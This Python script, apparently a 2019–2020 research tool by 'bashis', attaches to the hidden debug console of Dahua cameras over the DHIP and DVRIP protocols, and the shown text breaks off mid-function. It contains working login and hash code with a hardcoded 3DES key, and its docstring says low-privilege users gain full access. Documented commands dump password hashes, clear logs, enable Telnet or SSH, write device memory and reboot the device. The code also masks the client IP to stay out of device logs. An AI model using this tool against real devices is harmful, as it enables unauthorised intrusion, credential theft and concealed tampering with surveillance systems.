#!/usr/bin/env python3

"""
Author: bashis <mcw noemail eu> 2019, 2020
Subject: Dahua JSON Debug Console

[Updates]
January 2020:
1. Ported to Python 3
2. Fixed some bugs and code adjustment
3. Added support for DVRIP (TCP/37777) [Note: Some JSON commands that working with DHIP return nothing with DVRIP]
4. encode/decode in latin-1, we might need untouched chars between 0x00 - 0xff
5. Better 'debug' with hexdump as option

February 2020:
1. Added option 'setDebug', Should start produce output from Debug Console in VTO/VTH
2. Added '--discover', Multicast search of devices or direct probe (--rhost 192.168.57.20) of device via UDP/37810
3. Added '--dump {config,service}' for dumping config or services on remote host w/o entering Debug Console

March 2020:
1. DVRIP SessionID bug: "method": "snapManager.listMethod".
2. Renamed 'ssh' to 'sshd', 'ssh' already used in some FW.

[Description]
1. Supporting Dahua 'DHIP' P2P binary protocol, that works on normal HTTP/HTTPS ports and TCP/5000
2. Supporting Dahua 'DVRIP' P2P binary protocol, that works normally on TCP/37777
3. Will attach to Dahua devices internal 'Debug Console' using JSON (same type as the former debug on TCP/6789) 

[Login]
1. Authenticated access with valid l/p
2. Any lowpriv user will have full access
3. Default l/p with 'anonymity' works when Anonymous Login is enabled

[Get password hash]
1. Cmd: 'OnvifUser -u' (MD5 hash / cleartext)
2. Cmd: 'user -u' (MD5 hash)

[shell]
1. Cmd: 'shell' starts, but no I/O to/from shell (executes '/bin/sh -c sh')

[log]
1. When using DHIP, neither online users or login information will be logged
2. Cmd: 'log -c' will clear logs as username 'Console'
3. Cmd: 'log -a TEST' will generate 'TEST' log with username 'Console'

[Config]
1. Cmd: 'ceconfig -get Telnet' will show current 'Telnet' config
2. Cmd: 'ceconfig -set Telnet.Enable=true' will enable 'Telnet' (in my IPC, 'telnetd' will check if guid == 0, and exit with 0)
3. Cmd: 'ceconfig -get SSHD' will show current 'SSHD' config
4. Cmd: 'ceconfig -set SSHD.Enable=true' will enable 'SSHD' (in my IPC, 'sshd 'do not exist)
5. Few additional Cmd added as reference

[New Config]
1. Possible too add new non-Dahua config (create remote JSON dict and store some fun ;-)
2. Could be useful if there is service(s) available, but not started due lack of config 

[Interesting Cmd]
1. memory  -a addr     : dump 512 bytes m_szData from [addr]!
2. memory  -b addr val : write a byte [m_szData] to [addr]!
3. memory  -w addr val : write a word [m_szData] to [addr]!
4. memory -d addr val : write a double word [m_szData] to [addr]!
Note: If someone figure how to use these, I would appreciate some info...

[Bugs]
1. SSL do not work (SSL starts, but remote device returns non-SSL data when using DHIP)

[Verified]
Device Type: Dahua IPC-HDBW1320E-W
System Version: 2.400.0000000.16.R, Build Date: 2017-08-31

"""

import sys
import json
import ndjson	# pip3 install ndjson
import argparse
import copy
import _thread	
import inspect

#from Crypto.PublicKey.RSA import construct
from Crypto.PublicKey import RSA
from OpenSSL import crypto # pip3 install pyopenssl
from pwn import *	# https://github.com/Gallopsled/pwntools

global debug

# For Dahua DES/3DES
ENCRYPT = 0x00
DECRYPT = 0x01

#
# DVRIP have different codes in their protocols
#
def DahuaProto(proto):

	proto = binascii.b2a_hex(proto.encode('latin-1')).decode('latin-1')

	headers = [
		'f6000000',	# JSON Send
		'f6000068',	# JSON Recv
		'a0050000', # DVRIP login Send Login Details
		'a0010060', # DVRIP Send Request Realm
		'a0000000', # 3DES Login

		'b0000068', # DVRIP Recv
		'b0010068', # DVRIP Recv
		'a3010001', # DVRIP Discover Request
		'b3002301', # DVRIP Discover Response
	]

	for code in headers:
		if code[:4] == proto[:4]:
			return True


	return False


def DEBUG(direction, packet):

	if debug:
		packet = packet.encode('latin-1')

		# Print send/recv data and current line number
		print("[BEGIN {}] <{:-^60}>".format(direction, inspect.currentframe().f_back.f_lineno))
		if (debug == 2) or (debug == 3):
			print(hexdump(packet))
		if (debug == 1) or (debug == 3):
			if packet[0:8] == p64(0x2000000044484950,endian='big') or DahuaProto(packet[0:4].decode('latin-1')):

				if packet[0:2] == p16(0xb300,endian='big'):
					header = packet[0:120]
					data = packet[120:]
				else:
					header = packet[0:32]
					data = packet[32:]

#				if header[0:8] == p64(0x2000000044484950,endian='big'): # DHIP
#					print("\n-HEADER-  -DHIP-  SessionID   ID    RCVLEN             EXPLEN")
#				elif DahuaProto(packet[0:4].decode('latin-1')):	# DVRIP
#					print("\n PROTO   RCVLEN       ID            EXPLEN            SessionID")

				print("{}|{}|{}|{}|{}|{}|{}|{}".format(
					binascii.b2a_hex(header[0:4]).decode('latin-1'),binascii.b2a_hex(header[4:8]).decode('latin-1'),
					binascii.b2a_hex(header[8:12]).decode('latin-1'),binascii.b2a_hex(header[12:16]).decode('latin-1'),
					binascii.b2a_hex(header[16:20]).decode('latin-1'),binascii.b2a_hex(header[20:24]).decode('latin-1'),
					binascii.b2a_hex(header[24:28]).decode('latin-1'),binascii.b2a_hex(header[28:32]).decode('latin-1')))

				if data:
					print("{}\n".format(data.decode('latin-1')))
			elif packet: # Unknown packet, do hexdump
					log.failure("DEBUG: Unknow packet")
					print(hexdump(packet))
		print("[ END  {}] <{:-^60}>".format(direction, inspect.currentframe().f_back.f_lineno))
	return

def DHDiscover(rhost, protocol):

	if protocol == 'dhip':
		MCAST_GRP = rhost
		MCAST_PORT = 37810

		query_args = {
			"id":10000,
			"method":"DHDiscover.search",
			"params":{
				"mac":"",
				"uni":1
				},
			"session":0
			}

		header =  p64(0x2000000044484950,endian='big') + p64(0x0) + p32(len(json.dumps(query_args))) + p32(0x0) + p32(len(json.dumps(query_args))) + p32(0x0)
		packet = header + json.dumps(query_args).encode('latin-1')

		try:
			socket.setdefaulttimeout(3)
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
			DEBUG("SEND",packet.decode('latin-1'))
			sock.sendto(packet, (MCAST_GRP, MCAST_PORT))

			while True:
				data, addr = sock.recvfrom(4096)
				log.success("DHDiscover response from: {}:{}".format(addr[0],addr[1]))
				DEBUG("RECV",data.decode('latin-1'))
				data = data[32:].decode('latin-1')
				data = json.loads(data.strip('\x00'))

				log.info("S/N: {}, Model: {}, Ver: {}\nIPv4: {}, GW: {}, DHCP: {}, MAC: {}\n\n".format(
					data.get('params').get('deviceInfo').get('SerialNo'),
					data.get('params').get('deviceInfo').get('DeviceType'),
					data.get('params').get('deviceInfo').get('Version'),
					data.get('params').get('deviceInfo').get('IPv4Address').get('IPAddress'),
					data.get('params').get('deviceInfo').get('IPv4Address').get('DefaultGateway'),
					data.get('params').get('deviceInfo').get('IPv4Address').get('DhcpEnable'),data.get('mac')
					))

		except (Exception, KeyboardInterrupt, SystemExit) as e:
			pass

	return True

#
# The DES/3DES code in the bottom of this script.
# 
def Dahua_Gen0_hash(data, mode):

	# "secret" key for Dahua Technology
	key = b'poiuytrewq' # 3DES

	if len(data) > 8: # Max 8 bytes!
		log.failure("'{}' is more than 8 bytes, this will most probaly fail".format(data))
	data = data[0:8]
	data_len = len(data)

	key_len = len(key)

	#
	# padding key with 0x00 if needed
	#
	if key_len <= 8:
		if not (key_len % 8) == 0:
			key += p8(0x0) * (8 - (key_len % 8)) # DES (8 bytes)
	elif key_len <= 16:
		if not (key_len % 16) == 0:
			key += p8(0x0) * (16 - (key_len % 16)) # 3DES DES-EDE2 (16 bytes)
	elif key_len <= 24:
		if not (key_len % 24) == 0:
			key += p8(0x0) * (24 - (key_len % 24)) # 3DES DES-EDE3 (24 bytes)
	#
	# padding data with 0x00 if needed
	#
	if not (data_len % 8) == 0:
		data += p8(0x0).decode('latin-1') * (8 - (data_len % 8))

	if key_len == 8:
		k = des(key)
	else:
		k = triple_des(key)

	if mode == ENCRYPT:
		data = k.encrypt(data.encode('latin-1'))
	else:
		data = k.decrypt(data)
		data = data.decode('latin-1').strip('\x00') # Strip all 0x00 padding

	return data

#
# From: https://github.com/haicen/DahuaHashCreator/blob/master/DahuaHash.py
#
#
def compressor(in_var, out):
	i=0
	j=0
	
	while i<len(in_var):
		# python 2.x (thanks to @davidak501)
		# out[j] = (ord(in_var[i]) + ord(in_var[i+1])) % 62;
		# python 3.x
		out[j] = (in_var[i] + in_var[i+1]) % 62;
		if (out[j] < 10):
			out[j] += 48
		elif (out[j] < 36):
		  out[j] += 55;
		else:
			out[j] += 61        

		i=i+2
		j=j+1
		
def Dahua_Gen1_hash(passw):
#	if len(passw)>6:
#		debug("Warning: password is more than 6 characters. Hash may be incorrect")
	m = hashlib.md5()
	m.update(passw.encode("latin-1"))
	
	s=m.digest()
	crypt=[]
	for b in s:
		crypt.append(b)

	out2=['']*8
	compressor(crypt,out2)
	data=''.join([chr(a) for a in out2])
	return data
#
# END 
#

#
# Dahua DVRIP random MD5 password hash
#
def Dahua_DVRIP_md5_hash(Dahua_random, username, password):

	RANDOM_HASH = hashlib.md5((username + ':' + Dahua_random + ':' + Dahua_Gen1_hash(password)).encode('latin-1')).hexdigest().upper()

	return RANDOM_HASH

#
# Dahua random MD5 password hash
#
def Dahua_Gen2_md5_hash(Dahua_random, Dahua_realm, username, password):

	PWDDB_HASH = hashlib.md5((username + ':' + Dahua_realm + ':' + password).encode('latin-1')).hexdigest().upper()
	PASS = (username + ':' + Dahua_random + ':' + PWDDB_HASH).encode('latin-1')
	RANDOM_HASH = hashlib.md5(PASS).hexdigest().upper()

	return RANDOM_HASH

class Dahua_Functions:

	def __init__(self, rhost, rport, SSL, credentials, proto, force):
		self.rhost = rhost
		self.rport = rport
		self.SSL = SSL
		self.credentials = credentials
		self.proto = proto
		self.force = force

		# Internal sharing
		self.ID = 0							# Our Request / Responce ID that must be in all requests and initated by us
		self.SessionID = 0					# Session ID will be returned after successful login
		self.OBJECT = 0						# Object ID will be returned after called <service>.factory.instance
		self.SID = 0						# SID will be returned after we called <service>.attach with 'Object ID'
		self.CALLBACK = ''					# 'callback' ID will be returned after we called <service>.attach with 'proc: <Number>' (callback will have same number)
		self.FakeIPaddr = '(null)'			# WebGUI: mask our real IP
#		self.FakeIPaddr = '192.168.57.1'
		self.clientType = ''				# WebGUI: We do not show up in logs or online users
#		self.clientType = 'Web3.0'
		
		self.event = threading.Event()
		self.socket_event = threading.Event()
		self.lock = threading.Lock()

	#
	# This function will check and process any late incoming packets every second
	# At same time it will act as the delay for keepAlive of the connection
	#
	def sleep_check_socket(self,delay):
		keepAlive = 0
		sleep = 1

		while True:
			if delay <= keepAlive:
				break
			else:
				keepAlive += sleep
				# If received callback data, break
				if self.remote.can_recv():
					break
				time.sleep(sleep)
				continue


	def P2P_timeout(self,threadName,delay):

		log.success("Started keepAlive thread")

		while True:
			self.sleep_check_socket(delay)
			query_args = {
				"method":"global.keepAlive",
				"magic" : "0x1234",
				"params":{
					"timeout":delay,
					"active":True
					},
				"id":self.ID,
				"session":self.SessionID}
			data = self.P2P(json.dumps(query_args))
			if data == None:
				log.failure("keepAlive fail")
				self.event.set()
			elif len(data) == 1:
				data = json.loads(data)

				if data.get('result'):
					if self.event.is_set():
						log.success("keepAlive back")
						self.event.clear()
				else:
					# check for 'method' == 'client.notifyConsoleResult' and push it to Console if found
					if not self.ConsoleResult(json.dumps(data)):
						log.failure("keepAlive fail")
						self.event.set()
			else:

				data = ndjson.loads(data)
				for NUM in range(0,len(data)):
					if data[NUM].get('result'):
						if self.event.is_set():
							log.success("keepAlive back")
							self.event.clear()
					else:
						# check for 'method' == 'client.notifyConsoleResult' and push it to Console if found
						if not self.ConsoleResult(json.dumps(data[NUM])):
							log.failure("keepAlive fail")
							self.event.set()

	def P2P(self, packet):
		P2P_header = ""
		P2P_data = ""
		P2P_return_data = []
		header_LEN = 0
		LEN_RECVED = 0
		data = ''

		if packet == None:
			packet = ''

		header = copy.copy(self.header)
		header = header.replace('_SessionHexID_'.encode('latin-1'),p32(self.SessionID))
		header = header.replace('_LEN_'.encode('latin-1'),p32(len(packet)))
		header = header.replace('_ID_'.encode('latin-1'),p32(self.ID))

		try:
			if not len(header) == 32:
				log.error("Binary header != 32 ({})".format(len(header)))
		except Exception as e:
			return None

		self.ID += 1

		self.lock.acquire()

		DEBUG("SEND",header.decode('latin-1') + packet)

		try:
			self.remote.send(header + packet.encode('latin-1'))
		except Exception as e:
			if self.lock.locked():
				self.lock.release()
			self.socket_event.set()
			log.failure(str(e))

		#
		# We must expect there is no output from remote device
		# Some debug cmd do not return any output, some will return after timeout/failure, most will return directly
		#
		TIME = 0.5
		TIMEOUT = TIME

		while True:
			try:
				tmp = len(data)
				data += self.remote.recv(numb=8192,timeout=TIMEOUT).decode('latin-1')
				if not len(data):
					# Give few more seconds if there are not data, P2P_timeout() will take anything later
					if TIMEOUT == TIME:
						TIMEOUT = 2
						continue
				if tmp == len(data):
					break
			except Exception as e:
				self.socket_event.set()
				return None

		if not len(data):
			if self.lock.locked(): self.lock.release()
			if self.lock.locked():
				self.lock.release()
				log.failure("I haven't received anything from remote!!")
				return None

		while len(data):
			# DHIP
			if data[0:8] == p64(0x2000000044484950,endian='big').decode('latin-1'):
				P2P_header = data[0:32]
				LEN_RECVED = unpack(data[16:20].encode('latin-1'))
				LEN_EXPECT = unpack(data[24:28].encode('latin-1'))
				data = data[32:]
			# DVRIP
			elif DahuaProto(data[0:4]):
				LEN_RECVED = unpack(data[4:8].encode('latin-1'))
				LEN_EXPECT = unpack(data[16:20].encode('latin-1'))
				P2P_header = data[0:32]

				if P2P_header[24:28].encode('latin-1') == p32(0x0600f900,endian='big'):
					self.SessionID = unpack(P2P_header[16:20].encode('latin-1'))
					self.AuthCode = binascii.b2a_hex(P2P_header[28:32].encode('latin-1')).decode('latin-1')
					self.ErrorCode = binascii.b2a_hex(P2P_header[8:12].encode('latin-1')).decode('latin-1')
				if len(data) == 32:
					DEBUG("RECV",P2P_header)
					if self.lock.locked():
						self.lock.release()
				data = data[32:]
			else:
				if LEN_RECVED == 0:
					log.failure("P2P: Unknow packet")
					print("PROTO: \033[92m[\033[91m{}\033[92m]\033[0m".format(binascii.b2a_hex(data[0:4].encode('latin-1')).decode('latin-1')))
					print(hexdump(data))
					return None
				P2P_data = data[0:LEN_RECVED]
				if LEN_RECVED:
					DEBUG("RECV",P2P_header + data[0:LEN_RECVED])
				else:
					DEBUG("RECV",P2P_header)
				P2P_return_data.append(P2P_data)
				data = data[LEN_RECVED:]
				if self.lock.locked():
					self.lock.release()
				if LEN_RECVED == LEN_EXPECT and not len(data):
					break

		return ''.join(map(str, P2P_return_data))

	def Dahua_DHIP_Login(self):

		login = log.progress("Login")

		self.header =  p64(0x2000000044484950,endian='big') +'_SessionHexID__ID__LEN_'.encode('latin-1') + p32(0x0) +'_LEN_'.encode('latin-1')+ p32(0x0) 

		USER_NAME = self.credentials.split(':')[0]
		PASSWORD = self.credentials.split(':')[1]

		query_args = {
			"id" : 10000,
			"magic":"0x1234",
			"method":"global.login",
			"params":{
				"clientType":self.clientType,
				"ipAddr":self.FakeIPaddr,
				"loginType":"Direct",
				"password":"",
				"userName":USER_NAME,
				},
			"session":0
			}

		data = self.P2P(json.dumps(query_args))
		if data == None:
			login.failure("global.login [random]")
			return False
		data = json.loads(data)

		self.SessionID = data['session']
		RANDOM = data['params']['random']
		REALM = data['params']['realm']

		RANDOM_HASH = Dahua_Gen2_md5_hash(RANDOM, REALM, USER_NAME, PASSWORD)

		query_args = {
			"id":10000,
			"magic":"0x1234",
			"method":"global.login",
			"session":self.SessionID,
			"params":{
				"userName":USER_NAME,
				"password":RANDOM_HASH,
				"clientType":self.clientType,
				"ipAddr" : self.FakeIPaddr,	
				"loginType" : "Direct",
				"authorityType":"Default",
				},
			}

		data = self.P2P(json.dumps(query_args))
		if data == None:
			return False
		data = json.loads(data)

		if not data.get('result'):
			login.failure("global.login: {}".format(data['error']['message']))
			return False

		keepAlive = data['params']['keepAliveInterval']
		_thread.start_new_thread(self.P2P_timeout,("P2P_timeout", keepAlive,))

		login.success("Success")

		return True

	def Dahua_DVRIP_Login(self):

		login = log.progress("Login")

		USER_NAME = self.credentials.split(':')[0]
		PASSWORD = self.credentials.split(':')[1]

		if self.proto == '3des':

			# all above 8 char will be stripped 
			self.header =  p32(0xa0000000,endian='big') + p32(0x0) + Dahua_Gen0_hash(USER_NAME,ENCRYPT) + Dahua_Gen0_hash(PASSWORD,ENCRYPT) + p64(0x050200010000a1aa,endian='big')

			data = self.P2P(None)
			if data == None:
				return False

		elif self.proto == 'dvrip':

			#
			# REALM & RANDOM Request
			#
			self.header = p32(0xa0010000,endian='big') + (p8(0x00) * 20) + p64(0x050201010000a1aa,endian='big')

			data = self.P2P(None)
			if data == None or not len(data):
				login.failure("Realm")
				return False

			REALM = data.split('\r\n')[0].split(':')[1] if data.split('\r\n')[0].split(':')[0] == 'Realm' else False
			RANDOM = data.split('\r\n')[1].split(':')[1] if data.split('\r\n')[1].split(':')[0] == 'Random' else False

			if not RANDOM:
				login.failure("Realm [random]")
				return False

			#
			# Login request
			#

			HASH = USER_NAME + '&&' + Dahua_Gen2_md5_hash(RANDOM, REALM, USER_NAME, PASSWORD) + Dahua_DVRIP_md5_hash(RANDOM, USER_NAME, PASSWORD)
			self.header = p32(0xa0050000,endian='big') + p32(len(HASH)) + (p8(0x00) * 16) + p64(0x050200080000a1aa,endian='big')

			data = self.P2P(HASH)
			if data == None:
				return False
	#		if len(data):
	#			print(data)


		if self.ErrorCode[:4] == '0008':
			login.success("Success")
		elif self.ErrorCode[:4] == '0100':
			login.failure("Authentication failed: {} tries left {}".format(int(self.AuthCode[2:4],16), "(BUG: SessionID = {})".format(self.SessionID) if self.SessionID else ''))
			return False
		elif self.ErrorCode[:4] == '0101':
			login.failure("Username invalid")
			return False
		elif self.ErrorCode[:4] == '0104':
			login.failure("Account locked: {}".format(data))
			return False
		elif self.ErrorCode[:4] == '0105':
			login.failure("Undefined code: {}".format(self.ErrorCode[:4]))
			return False
		elif self.ErrorCode[:4] == '0113':
			login.failure("Not implemented: {}".format(self.ErrorCode[:4]))
			return False
		elif self.ErrorCode[:4] == '0303':
			login.failure("User already connected")
			return False
		else:
			login.failure("Unknown ErrorCode: {}".format(self.ErrorCode[:4]))
			return False

		keepAlive = 30 # Seems to be stable
		_thread.start_new_thread(self.P2P_timeout,("P2P_timeout", keepAlive,))

		self.header =  p32(0xf6000000,endian='big') + '_LEN__ID_'.encode('latin-1') + p32(0x0) + '_LEN_'.encode('latin-1') + p32(0x0) + '_SessionHexID_'.encode('latin-1') + p32(0x0)

		return True


	def CheckForConsole(self):

		query_args = {
			"method":"system.listService",
			"session":self.SessionID,
			"params":None,
			"id":self.ID
			}

		data = self.P2P(json.dumps(query_args))
		if data == None:
			return False

		data = json.loads(data)
		if data.get('result'):
			for count in range(0,len(data['params']['service'])):
				if data['params']['service'][count] == 'console':
					return True

		return False


	def DebugConsole(self):

		#
		# Additional Cmd list
		#
		cmd_list = {
		#
		# misc
		#
		'telnet':{
			'cmd':'self.telnetd_SSHD(msg)',
			'help':'Start / Stop (-h for params)',
			},
		'sshd':{
			'cmd':'self.telnetd_SSHD(msg)',
			'help':'Start / Stop (-h for params)',
			},
		'config':{
			'cmd':'self.config_members(msg)',
			'help':'remote config (-h for params)',
			},
		'service':{
			'cmd':'self.listService(msg)',
			'help':'List remote services and "methods" (-h for params)',
			},
		'device':{
			'cmd':'self.GetRemoteInfo(msg)',
			'help':'Dump some information of remote device',
			},
		'certificate':{
			'cmd':'self.GetRemoteInfo("certificate")',
			'help':'Dump some information of remote certificate',
			},
		'REBOOT':{
			'cmd':'self.reboot(msg)',
			'help':'Try force reboot of remote',
			},
		'setDebug':{
			'cmd':'self.setDebug(msg)',
			'help':'Should start produce output from Console in VTO/VTH',
			},
		'test-config':{
			'cmd':'self.newConfig(msg)',
			'help':' New config test (-h for params)',
			},
		}

		try:
			self.remote = remote(self.rhost, self.rport, ssl=self.SSL, timeout=5)
		except (Exception, KeyboardInterrupt, SystemExit):
			return False

		console = log.progress("Dahua JSON Console")
		console.status("Starting")

		if self.proto == 'dvrip' or self.proto == '3des':
			if not self.Dahua_DVRIP_Login():
				console.failure("Failed")
				return False

		elif self.proto == 'dhip':
			if not self.Dahua_DHIP_Login():
				console.failure("Failed")
				return False
		else:
			console.failure("Choose availible protocol: dhip / dvrip")
			return False

		query_args = {
			"method":"magicBox.getDeviceType",
			"params": None,
			"session":self.SessionID,
			"id":self.ID
			}
		data = self.P2P(json.dumps(query_args))
		if not data == None:
			data = json.loads(data)
			log.info("Remote device: {}".format(data.get('params').get('type')))
		if args.dump =='config':
			self.config_members("config all")
			console.success("Dump config")
			return False
		elif args.dump == 'service':
			self.listService('service all')
			console.success("Dump services")
			return False
		elif args.dump == 'device':
			self.GetRemoteInfo('device')
			console.success("Device info")
			return False

		if not self.CheckForConsole():
			console.failure("Service Console do not exist on remote device")
			return False

		query_args = {
			"id":self.ID,
			"magic":"0x1234",
			"method":"console.factory.instance",
			"params":None, 
			"session":self.SessionID
			}
		data = self.P2P(json.dumps(query_args))
		if data == None:
			console.failure("console.factory.instance")
			return False
		data = json.loads(data)

		#
		# If multiple Consoles is attached to one device, all attached Consoles will receive same output
		#
		self.OBJECT = data.get('result')
		self.ProcID = self.ID

		query_args = {
			"id":self.ID,						# (signed int)	# This ID will be persistent to the 'console'
			"magic":"0x1234",
			"method":"console.attach",
			"params":{
				"proc":self.ProcID,			# (unsigned int) Generates 'callback' in JSON from remote in 'console.runCmd' with same number
				},
			"object":self.OBJECT, 				# (unsigned int)
			"session":self.SessionID 			# (signed int)
			}

		data = self.P2P(json.dumps(query_args))
		if not data == None:
			data = json.loads(data)
			if data.get('error'): # "Challange" blob in some NVR seems to have issues to attach
				console.failure("Error: {}".format(json.dumps(data.get('error'))))
		if data == None or not data.get('result'):
			console.failure("console.attach")
			return False

		self.SID = data.get('params').get('SID')

		console.success("Success")

		while True:
			if self.socket_event.is_set():
				return False
			self.prompt()
			msg = sys.stdin.readline().strip().decode('latin-1')

			cmd = msg.split()

			if msg:
				if msg == 'shell' and not self.force:
					log.failure("[shell] will execute and hang the Console/Device (DoS)")
					log.failure("If you still want to try, run this script with --force")
					continue
				elif msg == 'exit' and not self.force:
					log.failure("[exit] You really want to exit? (maybe you mean 'quit' this connection?)")
					log.failure("If you still want to try, run this script with --force")
					continue

				for command in cmd_list:
					if command == cmd[0]:
						tmp = cmd_list[command]['cmd']
						exec(tmp)
						break
				if command == cmd[0]:
					continue

				query_args = {
					"SID":self.SID,
					"id":self.ID,
					"magic":"0x1234",
					"method":"console.runCmd",
					"params":{
						"command":msg,
						},
					"object":self.OBJECT,
					"session":self.SessionID
					}
				data = self.P2P(json.dumps(query_args))
				if not data == None:
					self.ConsoleResult(data)
				else:
					continue

				if msg == 'quit' or msg == 'shutdown' or msg == 'reboot':
					query_args = {
						"id":self.ID,
						"magic":"0x1234",
						"method":"console.detach",
						"params":{
							"proc":self.ProcID,
							},
						"object":self.OBJECT,
						"session":self.SessionID
						}
					data = self.P2P(json.dumps(query_args))
					if not data == None:
						data = json.loads(data)
						if not data.get('result'):
							log.failure("console.detach: {}".format(data))
						self.ConsoleResult(json.dumps(data))
					else:
						log.failure("console.detach")

					query_args = {
						"id":self.ID,
						"magic":"0x1234",
						"method":"console.destroy",
						"params":None, 
						"object":self.OBJECT,
						"session":self.SessionID
						}
					data = self.P2P(json.dumps(query_args))
					if not data == None:
						data = json.loads(data)
						if not data.get('result'):
							log.failure("console.destroy: {}".format(data))
						self.ConsoleResult(json.dumps(data))
					else:
						log.failure("console.destroy")
					return self.logout()

				elif msg == 'help':
					log.info("Local cmd:")
					for command in cmd_list:
						log.success("{}: {}".format(command,cmd_list[command]['help']))


		return

	def ConsoleResult(self,data):

		#
		# Some stuff prints sometimes 'garbage', like 'dvrip -l'
		#
		data = ndjson.loads(data,strict=False)
		for NUM in range(0,len(data)):
			data = data[NUM]

			if data.get('method') == 'client.notifyConsoleResult':
				#
				# Seems not to be used for anything useful, leaving it here for future reference
				#
	#			self.CALLBACK = data.get('callback')
	#			log.info("callback: {}".format(self.CALLBACK))

				paramsinfo = data['params']['info']

				if not int(paramsinfo.get('Count')):
					log.failure("Zero data received from Console")
					return False

				for paramscount in range(0,int(paramsinfo.get('Count'))):
					print(str(paramsinfo.get('Data')[paramscount]).strip('\n'))
				return True

			elif not data.get('result'):
				log.failure("Invalid command: 'help' for help")
			return False


	def reboot(self,msg):
		self.msg = msg
		self.cmd = msg.split()

		query_args = {
			"method":"magicBox.reboot",
			"params": {
				"delay":0
				},
			"session":self.SessionID,
			"id":self.ID
			}
		self.P2P(json.dumps(query_args))
		self.socket_event.set()
		log.success("Trying to force reboot")


	def logout(self):

		query_args = {
			"method":"global.logout",
			"params":None,
			"session":self.SessionID,
			"id":self.ID
			}
		data = self.P2P(json.dumps(query_args))
		if not data == None:
			data = json.loads(data)
			if data.get('result'):
				return True
			else:
				log.failure("global.logout: {}".format(data))
				return False
		else:
			return False

	def prompt(self):
		PromptText = "\033[92m[\033[91mConsole\033[92m]\033[0m# "
		sys.stdout.write(PromptText)
		sys.stdout.flush()

	def config_members(self,msg):
		msg = msg
		cmd = msg.split()

		if len(cmd) == 1 or cmd[1] == '-h':
			log.info("Usage:\n{}\n{}\n{}\n{}".format(
				"members: show config members",
				"all: dump all remote config",
				"<member>: dump config for <member>",
				"Note: Use 'ceconfig' in Console to set/get",
				))
			return True

		if cmd[1] == 'members':
			query_args = {
				"method":"configManager.getMemberNames",
				"params": {
					"name":"",
					},
				"session":self.SessionID,
				"id":self.ID
				}
		else:
			if cmd[1] == 'all':
				cmd[1] = 'All'
			query_args = {
				"method":"configManager.getConfig",
				"params": {
					"name":cmd[1],
					},
				"session":self.SessionID,
				"id":self.ID
				}

		data = self.P2P(json.dumps(query_args))
		if data == None:
			return
		data = json.loads(data)
		data.pop('id')
		data.pop('session')
		data.pop('result')
		print(json.dumps(data,indent=4))

		return


	def telnetd_SSHD(self,msg):
		cmd = msg.split()

		if cmd[0] == 'telnet':
			SERVICE = 'Telnet'
		elif cmd[0] == 'sshd':
			SERVICE = 'SSHD'

		if len(cmd) == 1 or cmd[1] == '-h':
			log.info("Usage:\n{} <1|enable or 0|disable>".format(cmd[0]))
			return False
		elif cmd[1] == 'enable' or cmd[1] == '1':
			enable = True
		elif cmd[1] == 'disable' or cmd[1] == '0':
			enable = False
		else:
			log.info("Usage:\n{} <1|enable or 0|disable>".format(cmd[0]))
			return False

		query_args = {
			"method":"configManager.getConfig",
			"params": {
				"name":SERVICE,
				},
			"session":self.SessionID,
			"id":self.ID
			}

		data = self.P2P(json.dumps(query_args))
		if data == None:
			return
		data = json.loads(data)
		if data.get('result'):
			if data['params']['table']['Enable'] == enable:
				log.failure("{} already: {}".format(cmd[0],"Enabled" if enable else "Disabled"))
				return
		else:
			log.failure("Failure: {}".format(data))
			return

		data['method'] = "configManager.setConfig"
		data['params']['table']['Enable'] = enable
		data['params']['name'] = SERVICE
		data['id'] = self.ID
		data.pop('result')

		data = self.P2P(json.dumps(data))
		if data == None:
			return
		data = json.loads(data)
		if data.get('result'):
			log.success("{}: {}".format(cmd[0],"Enabled" if enable else "Disabled"))
		else:
			log.failure("Failure: {}".format(data))
			return

	def listService(self,msg):
		msg = msg
		cmd = msg.split()

		if not len(cmd) == 1:
			if cmd[1] == '-h':
				log.info("Usage:\n{}\n{}\n{}".format(
					"<none>: dump all remote services",
					"<service>: dump methods for <service>",
					"all: dump all remote services methods (services all)"))
				return True

		query_args = {
			"method":"system.listService",
			"session":self.SessionID,
			"params": None,
			"id":self.ID
			}

		data = self.P2P(json.dumps(query_args))
		if data == None:
			log.failure("Failure to fetch: {}".format(cmd[1] if len(cmd) == 2 else None))
			return
		data = json.loads(data)
		if data.get('result'):
			data.pop('id')
			data.pop('session')
			if len(cmd) == 1:
				log.info("Remote Services ({}):".format(len(data['params']['service'])))
			for count in range(0,len(data['params']['service'])):
				if len(cmd) == 1 or len(cmd) == 2 and cmd[1] == 'all':
					print("{}".format(data['params']['service'][count]))

				if len(cmd) == 2 and cmd[1] == 'all':

					time.sleep(0.2)	# Seems to be needed...

					query_tmp = {
						"method":"",
						"session":self.SessionID,
						"id":self.ID
						}
					query_tmp.update({'method' : data['params']['service'][count] + '.listMethod'})
					data2 = self.P2P(json.dumps(query_tmp))
					if data2 == None:
						log.failure("Failure to fetch: {}".format(query_tmp.get('method')))
					else:
						data2 = json.loads(data2)
						if data2.get('result'):
							data2.pop('result')
							data2.pop('id')
							data2.pop('session') if data2.get('session') else log.failure("SessionID BUG") # SessionID bug: "method": "snapManager.listMethod"
							print(json.dumps(data2,indent=4))

				elif len(cmd) == 2 and cmd[1] == data['params']['service'][count]:
					log.success("methods for service: {}".format(cmd[1]))
					query_tmp = {
						"method":"",
						"session":self.SessionID,
						"id":self.ID
						}
					query_tmp.update({'method' : data['params']['service'][count] + '.listMethod'})
					data2 = self.P2P(json.dumps(query_tmp))
					if data2 == None:
						log.failure("Failure to fetch: {}".format(cmd[1]))
						return
					data2 = json.loads(data2)
					if data2.get('result'):
						data2.pop('id')
						data2.pop('session')
						print(json.dumps(data2,indent=4))


			return True
		else:
			log.failure("Failure: {}".format(data))
			return False

	def GetRemoteInfo(self,msg):
		msg = msg
		cmd = msg.split()

		if cmd[0] == 'device':

			query_args = {
				"method":"magicBox.getSoftwareVersion",
				"session":self.SessionID,
				"params": None,
				"id":self.ID
				}
			data = self.P2P(json.dumps(query_args))
			if not data == None:
				data = json.loads(data)
				VERSION = data.get('params').get('version').get('Version',"(null)")

			query_args = {
				"method":"magicBox.getProductDefinition",
				"session":self.SessionID,
				"params": None,
				"id":self.ID
				}

			data = self.P2P(json.dumps(query_args))
			if not data == None:
				data = json.loads(data)

				if data.get('result'):
					data = data.get('params').get('definition')
